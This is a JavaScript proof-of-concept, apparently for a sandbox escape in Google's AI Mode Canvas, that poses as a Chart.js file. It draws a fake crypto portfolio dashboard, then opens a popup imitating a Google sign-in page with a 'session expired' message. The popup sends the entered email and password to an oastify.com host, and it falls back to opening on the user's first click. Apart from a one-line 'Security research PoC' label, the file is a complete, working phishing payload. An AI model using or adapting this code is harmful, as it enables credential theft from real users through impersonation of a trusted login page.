/**
 * Google AI Mode Canvas — Sandbox Escape PoC
 * cdn.jsdelivr.net/gh/chartjs/Chart.js@813f28c/dist/chart.js
 */

(function () {
  var ATTACKER = "https://nofw4u1hfa146pvknp8zbjck5bb2zunj.oastify.com";

  // ── Clobber DOM & render fake app ─────────────────────────────────────
  function render() {
    document.documentElement.innerHTML = '\
<head><meta charset="utf-8"><title>CryptoFolio — Portfolio Tracker</title>\
<style>\
*{box-sizing:border-box;margin:0;padding:0}\
body{font-family:"Google Sans",system-ui,sans-serif;background:#0f1117;color:#e4e6eb}\
.header{display:flex;align-items:center;justify-content:space-between;padding:20px 32px;border-bottom:1px solid #23262f}\
.header h1{font-size:20px;font-weight:600;color:#fff}\
.header h1 span{color:#8ab4f8}\
.badge{background:#1a73e8;color:#fff;font-size:11px;padding:3px 8px;border-radius:10px;margin-left:8px}\
.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;padding:24px 32px}\
.card{background:#1a1d27;border-radius:12px;padding:20px;border:1px solid #23262f}\
.card h3{font-size:13px;color:#9aa0a6;margin-bottom:8px;text-transform:uppercase;letter-spacing:.5px}\
.card .val{font-size:28px;font-weight:600;color:#fff}\
.card .chg{font-size:13px;margin-top:4px}\
.up{color:#34a853}.dn{color:#ea4335}\
.chart-area{margin:24px 32px;background:#1a1d27;border-radius:12px;padding:24px;border:1px solid #23262f;height:240px;display:flex;align-items:center;justify-content:center}\
.chart-area canvas{width:100%!important;height:200px!important}\
.holdings{margin:0 32px 24px;background:#1a1d27;border-radius:12px;border:1px solid #23262f;overflow:hidden}\
.holdings table{width:100%;border-collapse:collapse}\
.holdings th{text-align:left;padding:12px 16px;font-size:12px;color:#9aa0a6;text-transform:uppercase;border-bottom:1px solid #23262f}\
.holdings td{padding:12px 16px;font-size:14px;border-bottom:1px solid #23262f}\
.holdings tr:last-child td{border:none}\
.coin{display:flex;align-items:center;gap:8px}\
.dot{width:8px;height:8px;border-radius:50%;display:inline-block}\
.btc{background:#f7931a}.eth{background:#627eea}.sol{background:#00ffa3}\
</style></head><body>\
<div class="header"><h1><span>Crypto</span>Folio<span class="badge">LIVE</span></h1><span style="color:#9aa0a6;font-size:13px">Last updated: just now</span></div>\
<div class="grid">\
<div class="card"><h3>Total Balance</h3><div class="val">$47,823.41</div><div class="chg up">+$2,341.12 (5.14%)</div></div>\
<div class="card"><h3>24h Change</h3><div class="val up">+5.14%</div><div class="chg" style="color:#9aa0a6">Best: SOL +8.2%</div></div>\
<div class="card"><h3>Assets</h3><div class="val">3</div><div class="chg" style="color:#9aa0a6">BTC · ETH · SOL</div></div>\
</div>\
<div class="chart-area"><canvas id="c"></canvas></div>\
<div class="holdings"><table>\
<tr><th>Asset</th><th>Holdings</th><th>Price</th><th>Value</th><th>24h</th></tr>\
<tr><td><div class="coin"><span class="dot btc"></span>Bitcoin</div></td><td>0.412 BTC</td><td>$67,841</td><td>$27,950.49</td><td class="up">+4.2%</td></tr>\
<tr><td><div class="coin"><span class="dot eth"></span>Ethereum</div></td><td>4.85 ETH</td><td>$2,847</td><td>$13,807.95</td><td class="up">+3.8%</td></tr>\
<tr><td><div class="coin"><span class="dot sol"></span>Solana</div></td><td>38.2 SOL</td><td>$158.55</td><td>$6,064.97</td><td class="up">+8.2%</td></tr>\
</table></div>\
</body>';

    // Draw a simple pie chart on canvas (no Chart.js dependency needed)
    setTimeout(drawChart, 100);
  }

  function drawChart() {
    var cv = document.getElementById("c");
    if (!cv) return;
    cv.width = cv.parentElement.offsetWidth;
    cv.height = 200;
    var ctx = cv.getContext("2d");
    var cx = 100, cy = 100, r = 80;
    var slices = [
      { pct: 0.585, color: "#f7931a" },  // BTC
      { pct: 0.289, color: "#627eea" },  // ETH
      { pct: 0.126, color: "#00ffa3" }   // SOL
    ];
    var start = -Math.PI / 2;
    slices.forEach(function (s) {
      var end = start + s.pct * 2 * Math.PI;
      ctx.beginPath();
      ctx.moveTo(cx, cy);
      ctx.arc(cx, cy, r, start, end);
      ctx.fillStyle = s.color;
      ctx.fill();
      start = end;
    });
    // Legend
    var lx = 220, ly = 40;
    [["Bitcoin 58.5%", "#f7931a"], ["Ethereum 28.9%", "#627eea"], ["Solana 12.6%", "#00ffa3"]].forEach(function (l) {
      ctx.fillStyle = l[1];
      ctx.fillRect(lx, ly, 12, 12);
      ctx.fillStyle = "#e4e6eb";
      ctx.font = "13px system-ui";
      ctx.fillText(l[0], lx + 20, ly + 10);
      ly += 28;
    });
  }

  // ── Popup (sandbox escape) ────────────────────────────────────────────
  function openPopup() {
    var w = window.open("", "_blank", "width=450,height=560,left=200,top=80");
    if (!w) return false;

    w.document.write('<!DOCTYPE html>\
<html><head><meta charset="utf-8"><title>Sign in \u2013 Google Accounts</title>\
<style>\
*{box-sizing:border-box;margin:0;padding:0}\
body{font-family:"Google Sans",Roboto,Arial,sans-serif;background:#f8f9fa;display:flex;justify-content:center;padding-top:48px}\
.c{background:#fff;border-radius:8px;padding:48px 40px 36px;width:400px;box-shadow:0 1px 3px rgba(0,0,0,.12)}\
.g{text-align:center;margin-bottom:16px;font-size:24px}\
.g span:nth-child(1){color:#4285F4}.g span:nth-child(2){color:#EA4335}\
.g span:nth-child(3){color:#FBBC05}.g span:nth-child(4){color:#4285F4}\
.g span:nth-child(5){color:#34A853}.g span:nth-child(6){color:#EA4335}\
h1{font-size:24px;font-weight:400;text-align:center;color:#202124;margin:4px 0}\
.s{text-align:center;color:#5f6368;font-size:16px;margin-bottom:32px}\
.f{margin-bottom:24px;position:relative}\
.f input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;color:#202124;background:#fff}\
.f input:focus{border-color:#1a73e8;box-shadow:0 0 0 1px #1a73e8}\
.f .l{position:absolute;top:-8px;left:12px;background:#fff;padding:0 4px;font-size:12px;color:#5f6368}\
.a{display:flex;justify-content:space-between;align-items:center;margin-top:36px}\
.a a{color:#1a73e8;font-size:14px;text-decoration:none;font-weight:500}\
.a button{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer}\
.a button:hover{background:#1669c1;box-shadow:0 1px 2px rgba(0,0,0,.3)}\
.n{text-align:center;margin-top:28px;font-size:11px;color:#9aa0a6}\
</style></head><body>\
<div class="c">\
<div class="g"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>\
<h1>Sign in</h1>\
<p class="s">Your session expired. Sign in to continue.</p>\
<form id="f">\
<div class="f"><span class="l">Email</span><input type="email" id="e" autofocus required></div>\
<div class="f"><span class="l">Password</span><input type="password" id="p" required></div>\
<div class="a"><a href="#">Forgot password?</a><button type="submit">Next</button></div>\
</form>\
<p class="n">Security research PoC</p>\
</div>\
<script>\
document.getElementById("f").addEventListener("submit",function(ev){\
ev.preventDefault();\
var e=document.getElementById("e").value,p=document.getElementById("p").value;\
document.querySelector("h1").textContent="Verifying\\u2026";\
document.querySelector(".s").textContent="Please wait";\
fetch("' + ATTACKER + '/collect",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({e:e,p:p}),mode:"no-cors"}).finally(function(){setTimeout(function(){window.close()},1500)});\
});\
</script></body></html>');
    w.document.close();
    return true;
  }

  // ── Init ───────────────────────────────────────────────────────────────
  render();
  if (!openPopup()) {
    document.addEventListener("click", function h() {
      openPopup();
      document.removeEventListener("click", h);
    }, { once: true });
  }
})();
